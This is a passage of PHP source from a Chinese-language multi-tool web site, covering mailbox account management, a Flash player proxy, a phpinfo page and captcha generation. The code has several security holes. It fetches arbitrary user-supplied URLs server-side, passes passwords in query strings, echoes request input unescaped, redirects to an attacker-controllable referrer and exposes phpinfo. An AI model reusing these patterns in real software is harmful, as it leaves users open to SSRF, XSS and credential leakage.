                if (trim(request("create")) == ""){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("domain.list")."&authdata=".encodeuri(trim(request("authdata")))?>" target=_self>邮箱</a> - <?php echo base64_decode(trim(request("uname")));?> <?php if (trim(request("domainname")) != ""){echo " - <a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&domainname=".trim(request("domainname"))."\" target=_self>".trim(request("domainname"))."</a>";} ?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=live&action=<?php echo encodeuri("account.create");?>&pagesize=<?php  echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&authdata=".encodeuri(trim(request("authdata")))."&skin=".$skincolor."&create=1"?>" method="post" name="live">
                        &nbsp用户名：<input type="text" class="text" name="username" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>
                        <SELECT name="domainname" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:154px;height:16px;font-size:12px">
                                <OPTION VALUE="<?php echo "@".trim(request("domainname"))?>"><?php echo "@".trim(request("domainname"))?></OPTION>
                                <OPTION VALUE="">其他邮箱</OPTION>
                        </SELECT>
                        &nbsp密码：<input type="password" class="text" name="password" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp验证密码：<input type="password" class="text" name="password2" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp姓氏：<input type="text" class="text" name="firstname" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp名字：<input type="text" class="text" name="lastname" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        <?php 
                        $url = httppath()."?api=lcid";
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $url);
                        curl_setopt($ch, CURLOPT_HEADER, 0);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                        $xmlstr = curl_exec($ch);
                        curl_close($ch);                        
                        $lcid = split("[\r\n]",$xmlstr);
                        ?><SELECT name="lcid" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:190px;height:16px;font-size:12px">
                                <OPTION VALUE="">所属地区</OPTION>
                        <?php 
                        for($i=0;$i<count($lcid);$i++){
                                if($lcid[$i] == ""){
                                        break;
                                }
                        ?>      <OPTION VALUE="<?php echo preg_replace("/(.+)[ ]\(([\d]+)\)/", "\$2", $lcid[$i])?>"><?php echo preg_replace("/(.+)[ ](\([\d]+\))/", "\$1", $lcid[$i])?></OPTION>
                        <?php 
                        }                               
                        ?></SELECT>
                        <noscript>
                        <input type="hidden" class="text" name="lcid" value="2052"> 
                        </noscript>
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER["HTTP_REFERER"]))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                } 
                else{
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        if (trim($_POST["username"]) != "" && trim($_POST["domainname"]) != "" && trim($_POST["password"]) != "" && trim($_POST["password2"]) != "" && trim($_POST["firstname"]) != "" && trim($_POST["lastname"]) != "" && trim($_POST["lcid"]) != ""){
                                if (trim(request("password"))==trim(request("password2"))){
                                }
                                else{
                                        AlertBack("两次输入密码不同" , 1);
                                        break;                          
                                }       
                        }
                        elseif ((trim($_POST["username"]) == "" || trim($_POST["domainname"]) == "" || trim($_POST["password"]) == "" || trim($_POST["password2"]) == "" || trim($_POST["firstname"]) == "" || trim($_POST["lastname"]) == "" || trim($_POST["lcid"]) == "") && trim(request("create"))!=""){
                                //echo $_post;
                                //echo httppath()."?".$_SERVER['QUERY_STRING'];
                                AlertBack("信息输入不完整！请重新输入！" , 2);
                                break;                          
                        }                       
                        
                        if (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&authdata=".encodeuri(trim(request("authdata"))));
                                break;
                        }       
                        elseif (trim(request("authdata")) == "" && trim($_SESSION["live"]["authdata"])==""){
                                redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&authdata=");
                                break;
                        }

                        //echo httppath()."?".$_SERVER['QUERY_STRING'];
                        //echo trim($_SESSION["live"]["authdata"]);
                        $live_mailbox = new live_class();
                        $accountcreate = $live_mailbox->liveaccountcreate(trim($_SESSION["live"]["authdata"]),trim(request("domainname")),trim(request("username")),trim(request("password")),trim(request("firstname")),trim(request("lastname")),trim(request("lcid")));
                        //echo trim($_SESSION["live"]["authdata"]).trim(request("domainname")).trim(request("username")).trim(request("password")).trim(request("firstname")).trim(request("lastname")).trim(request("lcid"));
                        //return;
                        $timeout = "5000";
                        if ($accountcreate['xmlcode'] == "200"){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        帐号添加成功！操作结果是：<?php  echo $accountcreate['result']." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";               
                        }       
                        else{   
                                $timeout = "15000";
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        帐号添加失败！操作结果是：<?php  echo $accountcreate["error"]." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";               
                        }
                }       
                break;
        case "account.rename":  
                if (trim(request('create')) == ''){
?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("domain.list")."&authdata=".encodeuri(trim(request("authdata")))?>" target=_self>邮箱</a> - <?php echo base64_decode(trim(request("uname")));?> <?php if (trim(request("domainname")) != ""){echo " - <a style=\"color:#000000\" href=\"".ScriptPath()."?api=live&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("account.list")."&authdata=".encodeuri(trim(request("authdata")))."&domainname=".trim(request("domainname"))."\" target=_self>".trim(request("domainname"))."</a>";} ?> ] </td>
        </tr>
</table>

<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=live&action=<?php echo encodeuri("account.rename");?>&pagesize=<?php  echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&oldusername=".encodeuri(trim(request("username")))."&skin=".$skincolor."&create=1"?>" method="post" name="live">
                        <?php 
                        if (preg_replace("/(.+)[@](.+)/", "\$2", trim(request('username'))) == trim(request('domainname'))){
                        ?>
                                &nbsp用户名：<input type="text" class="text" name="username" value="<?php echo preg_replace("/(.+)[@](.+)/", "\$1", trim(request('username')));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>
                                <SELECT name="domainname" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:154px;height:16px;font-size:12px">
                                        <OPTION VALUE="<?php echo "@".trim(request("domainname"))?>" selected><?php echo "@".trim(request("domainname"))?></OPTION>
                                        <OPTION VALUE="">其他邮箱</OPTION>
                                </SELECT>
                                <noscript>
                                &nbsp用户名：<input type="text" class="text" name="username" value="<?php echo preg_replace("/(.+)[@](.+)/", "\$1", trim(request('username')));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>
                                </noscript>
                        <?php                                       
                        }
                        else{
                        ?>
                                &nbsp用户名：<input type="text" class="text" name="username" value="<?php echo trim(request("username"));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>
                                <SELECT name="domainname" size="1" <?php  $style->selectarea("#FCFC9D",""); ?> style="width:154px;height:16px;font-size:12px">
                                        <OPTION VALUE="<?php echo "@".trim(request("domainname"))?>"><?php echo "@".trim(request("domainname"))?></OPTION>
                                        <OPTION VALUE="" selected>其他邮箱</OPTION>
                                </SELECT>
                        <?php                                       
                        }
                        ?>      
                        &nbsp验证码：<input maxlength="4" <?php  $style->textarea("#FCFC9D","") ?> name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER["HTTP_REFERER"]))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php       
                        
                }
                else{
                        //echo trim(request('oldusername'));
                        //return;
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        if (trim($_POST["username"]) == "" && trim(request("create"))!=""){
                                //echo $_post;
                                //echo httppath()."?".$_SERVER['QUERY_STRING'];
                                AlertBack("信息输入不完整！请重新输入！" , 2);
                                break;                          
                        }                       
                        
                        if (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&authdata=".encodeuri(trim(request("authdata"))));
                                break;
                        }       
                        elseif (trim(request("authdata")) == "" && trim($_SESSION["live"]["authdata"])==""){
                                redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=&pwd=&action=&authdata=");
                                break;
                        } 

                        $live_mailbox = new live_class();
                        $accountrename = $live_mailbox->liveaccountrename(trim($_SESSION["live"]["authdata"]),trim(request("domainname")),trim(request("username")),trim(request("oldusername")));
                        $timeout = "5000";
                        //print_r($accountrename);
                        if ($accountrename['xmlcode'] == "200"){
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        帐号修改成功！<?php  echo ($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";               
                        }       
                        else{   
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        帐号修改失败！ 秒后返回上一页
                </td>
        </tr>   
</table>                        
                        <?php       
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";               
                        }
                }
                break;
        default:
								if ($_SESSION["live"]["uname"] != "" && $_SESSION["live"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=live&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["live"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["live"]["pwd"])))."&action=".trim("email")."&checkcode=".trim(request("checkcode")));
                        break;
                }        
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=live&action=email&skin=<?php  echo $skincolor;?>" method="post" name="live">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
               </td>
        </tr>   
</table>
<?php               
        
                break;          
}
$style->footer();
exit;
}
?>

<?php 
function player(){ // checkcode function start
header('Content-Type: text/html; charset=gb2312');
switch (trim(request('action'))) { //action switch start
        case 'binary':
                header('Content-Type:application/x-shockwave-flash');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, trim(request('pathurl')));
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
                echo $xmlstr;
                break;
        case 'config':
                echo '<'.'?'.'xml version="1.0" encoding="gb2312"'.'?'.'>';
?><config>
<cflist>
<list name="最近更新">xml/list0.xml</list>
<list name="华语流行">xml/list1.xml</list>
</cflist>
<bg>
<u></u></bg>
<scene>
<s fg="0">http://pk990ys.googlepages.com/scene.swf</s></scene>
<ads>
<txt>无法正常显示请升级为Flash player 9</txt>
<txt>点击歌曲序号前的X可删除指定歌曲</txt>
<txt>歌曲序号前的+可收藏歌曲进我的收藏夹</txt>
<txt>方向键可控制快进、快退、上一首、下一首</txt>
<txt>数字键可直接定位歌曲的序号 回车确认播放</txt>
<txt>功能键HOME等可上下翻页、首尾页</txt>
<txt>C 键直接进入我的收藏夹</txt>
<txt>S 键停止/播放  空格 键暂停/播放</txt>
<txt>Shift Ctrl 播放视频时大小屏切换</txt>
<txt>采用缓存技术(缓存2天)，下次直接访问缓存</txt>
<txt>主界面右键菜单可以更新数据</txt></ads>
<readme><?php  echo trim(request('title'))!=""?trim(request('title'))." - ":"";?>X3193 - PK990 Flash 多功能播放器!</readme>
<other>
<l>autoplay=3</l>
<l>scalemode=2</l>
<l>size=12</l>
<l>width=550</l>
<l>height=400</l>
<?php 
switch (trim(request('skin'))) {
    case "black":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#DDDDDD</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l><?php 
        break;
    case "red":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#FFDDDD</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l>
<?php 
        break;
    case "blue":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#CCE0FF</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l>
<?php 
        break;
    case "purple":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#F5D6F5</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l>
<?php 
        break;
    case "green":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#CBEFCB</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l>
<?php 
        break;
    case "gold":
?>
<l>lrccolor1=#777777</l>
<l>lrccolor2=#777777</l>
<l>listcolor1=#777777</l>
<l>listcolor2=#777777</l>
<l>classcolor1=#777777</l>
<l>classcolor2=#777777</l>
<l>bgcolor=#FAEFC0</l>
<l>controlcolor=#777777</l>
<l>titlecolor=#777777</l>
<?php 
        break;
    default:
?>
<l>lrccolor1=#ffffff</l>
<l>lrccolor2=#cccccc</l>
<l>listcolor1=#ffffff</l>
<l>listcolor2=#cccccc</l>
<l>classcolor1=#ffffff</l>
<l>classcolor2=#cccccc</l>
<l>bgcolor=#000000</l>
<l>controlcolor=#cccccc</l>
<l>titlecolor=#ffffff</l>
<?php 
        break;
}
?>
<l>sys=1</l>
<l>lrcalign=center</l>
<l>last=1</l>
<l>prefix=1</l>
<l>vol=80</l>
<l>cache=0</l>
<l>skinid=0</l>
<l>rcm=t,t,t2,t</l></other>
<bgpic>
<i></i></bgpic>
<Skin>
<t>skin/blog.zip</t>
<t>skin/kugou.zip</t>
<t>skin/s_full.zip</t></Skin>
<version>?api=player</version>
<copyright><?php  echo trim(request('title'))!=""?trim(request('title'))." - ":"";?>X3193</copyright>
</config><?php              
                break;
        case 'config':
                echo '<'.'?'.'xml version="1.0" encoding="gb2312"'.'?'.'>';
                break;
        default:
                session_start();

?>
<head>
                <?php 
                $style = new css();
                $style->ico();
                $style->title("X3193 - 播放");
                $skincolor = selstyle(trim(request("skin")));
                $sCrLf = chr(13) . chr(10); // 回车 + 换行                
                ?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php   IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);?>
                </td>
        </tr>           
</table>
<?php 
if (trim($_POST["url"]) == "" && trim($_GET["url"]) == ""){
?>
<script language="javascript">
function changeimg()
{
 document.getElementById("ccimg").src = '<?php  echo ScriptPath(); ?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php  echo ScriptPath();?>?api=player" method="post" name="dnspod">
                        &nbsp标题：<input type="text" class="text" name="title" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp网址连接：<input type="text" class="text" name="url" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> style="height:20px;font-size:11px" maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" style="height:14px;" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
}
elseif (trim($_POST["url"]) != "" && trim($_GET["url"]) == ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }
        
        redirect(ScriptPath()."?".$_SERVER['QUERY_STRING']."&skin=".$skincolor."&url=".encodeuri(iconv('gb2312','utf-8',trim($_POST["url"])))."&title=".encodeuri(trim(request("title")))."&checkcode=".trim(request("checkcode")));
        break;
}
elseif (trim($_POST["url"]) == "" && trim($_GET["url"]) != ""){
        //if (!stripos(trim(request("url")),"://")) AlertBack("连接中未包括完整连接地址！ ", 2);
?>
<table width="95%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" height="15">
                </td>
        </tr>   
</table>
<table width="95%" height="82%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center" style="border:0">
                <td align="center">
        <?php 
        if(!file_exists('./pk990.swf')){
                $pathurl = "http://pk990.com/mp3/pkplay.swf?id=22737";
                //header('Content-Type:application/x-shockwave-flash');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $pathurl);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
                $handle = fopen("./pk990.swf", "wb");
                fwrite($handle, $xmlstr);
                fclose($handle);        
        }
        else{
                $pathurl = httppathdir()."/pk990.swf";
        }       
        //echo $pathurl;
        ?>
                        <embed src="<?php  echo httppath()."?api=player&action=binary&pathurl=".encodeuri($pathurl);?>&config=<?php echo encodeuri(httppath()."?api=player&action=config&skin=".$skincolor."&title=".encodeuri(trim(request("title"))))?>&skins=<?php  echo encodeuri("skin/X3193.zip");?>&url=<?php  echo encodeuri(trim(request("url")));?>&vol=80&autoplay=3&scalemode=2" id="swfplayer" quality="high" allowscriptaccess="always" allowfullscreen="true" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%" BORDER="0" />
                </td>
        </tr>
</table>                
<?php 
}
                $style->footer();
                break;
} //action switch start 
exit;
} // player function end

?>

<?php 
function phpsysinfo(){

syssetini();    
phpinfo();
exit;

}
?>

<?php 
function randcode($count,$type){
$authnum_session = ''; 
if ($type == ''){
	$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
}
elseif ($type == 'number'){
	$str = '1234567890'; 
}
elseif ($type == 'char'){
	$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
}

//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = $count;
for($i=1;$i<=$numcount;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
return $authnum_session;
}
?>

<?php 
function checkcode(){ // checkcode function start
        Com_CreatValidCode('ValidCode');
        exit;   
}

function Com_CreatValidCode($pSN){ 
Header("Content-type:image/png",false);
//定义header，声明图片文件，最好是png，无版权之扰; 
//生成新的四位整数验证码 
session_start();//开启session; 
$authnum_session = ''; 
$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = trim(request("count"))==""?"4":trim(request("count"));
for($i=1;$i<=4;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
//$pSN = $authnum_session;
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register($pSN);
}
 
$_SESSION[$pSN] = $authnum_session; 
//用session来做验证也不错;注册session,名称为authnum_session, 
//其它页面只要包含了该图片 
//即可以通过$_SESSION["authnum_session"]来调用 

//生成验证码图片， 
srand((double)microtime()*1000000); 
$im = imagecreate(52,14);//图片宽与高; 
//主要用到黑白灰三种色; 
$bgcolor = ImageColorAllocate($im, 255,255,255); 
$fontcolor = ImageColorAllocate($im, 0,0,0); 
$gray = ImageColorAllocate($im, 0,0,0); 
//将四位整数验证码绘入图片 
imagefill($im,68,30,$gray); 
//如不用干扰线，注释就行了; 
$li = ImageColorAllocate($im, 0,0,0); 
for($i=0;$i<3;$i++) 
{//加入3条干扰线;也可以不要;视情况而定，因为可能影响用户输入; 
        imageline($im,rand(0,30),rand(0,21),rand(20,40),rand(0,21),$li); 
} 
//字符在图片的位置; 
imagestring($im, 6, 8, -2.5, $authnum_session, $fontcolor); 
for($i=0;$i<90;$i++) 
{//加入干扰象素 
        imagesetpixel($im, rand()%70 , rand()%30 , $gray); 
} 
ImagePNG($im); 
ImageDestroy($im); 

} // checkcode function end
?>

<?php 

/***************************************************************************  
*                        Pinyin.php(做为现在的主流开发语言)  
*                ------------------------------  
*        Date             : Nov 7, 2006  
*        Copyright        : 修改自网络代码,版权归原作者所有  
*        Mail             :   
*        Desc.            : 拼音转换  
*        History          :  
*        Date    :  
*        Author  :   
*        Modif.  :  
*        Usage Example   :  
***************************************************************************/  

function Pinyin($_String, $_Code='gb2312',$_symbol=false,$_lang='cn')  
{  
        if ($_lang == "cn"){
                $_DataKey = "a|ai|an|ang|ao|ba|bai|ban|bang|bao|bei|ben|beng|bi|bian|biao|bie|bin|bing|bo|bu|ca|cai|can|cang|cao|ce|ceng|cha".  
                        "|chai|chan|chang|chao|che|chen|cheng|chi|chong|chou|chu|chuai|chuan|chuang|chui|chun|chuo|ci|cong|cou|cu|".  
                        "cuan|cui|cun|cuo|da|dai|dan|dang|dao|de|deng|di|dian|diao|die|ding|diu|dong|dou|du|duan|dui|dun|duo|e|en|er".  
                        "|fa|fan|fang|fei|fen|feng|fo|fou|fu|ga|gai|gan|gang|gao|ge|gei|gen|geng|gong|gou|gu|gua|guai|guan|guang|gui".  
                        "|gun|guo|ha|hai|han|hang|hao|he|hei|hen|heng|hong|hou|hu|hua|huai|huan|huang|hui|hun|huo|ji|jia|jian|jiang".  
                        "|jiao|jie|jin|jing|jiong|jiu|ju|juan|jue|jun|ka|kai|kan|kang|kao|ke|ken|keng|kong|kou|ku|kua|kuai|kuan|kuang".  
                        "|kui|kun|kuo|la|lai|lan|lang|lao|le|lei|leng|li|lia|lian|liang|liao|lie|lin|ling|liu|long|lou|lu|lv|luan|lue".  
                        "|lun|luo|ma|mai|man|mang|mao|me|mei|men|meng|mi|mian|miao|mie|min|ming|miu|mo|mou|mu|na|nai|nan|nang|nao|ne".  
                        "|nei|nen|neng|ni|nian|niang|niao|nie|nin|ning|niu|nong|nu|nv|nuan|nue|nuo|o|ou|pa|pai|pan|pang|pao|pei|pen".  
